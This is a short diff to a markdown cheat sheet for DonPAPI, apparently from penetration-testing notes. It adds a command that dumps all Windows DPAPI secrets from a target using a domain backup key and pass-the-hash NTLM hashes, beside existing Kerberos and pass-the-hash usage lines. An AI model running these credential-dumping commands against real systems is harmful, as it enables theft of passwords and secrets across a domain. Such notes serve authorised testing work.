@@ -18,3 +18,10 @@ DonPAPI -k <domain>/<user>@<target>
 ```
 DonPAPI --hashes <LM>:<NT> <domain>/<user>@<target>
 ```
+
+
+## DonPAPI - Dump all secrets with Domain Admin and PVK (pth)
+run dpapi.py to get PVK
+```
+DonPAPI -pvk <pvk_path> -o <out_path> --hashes <LM>:<NT> <domain>/<user>@<target>
+```
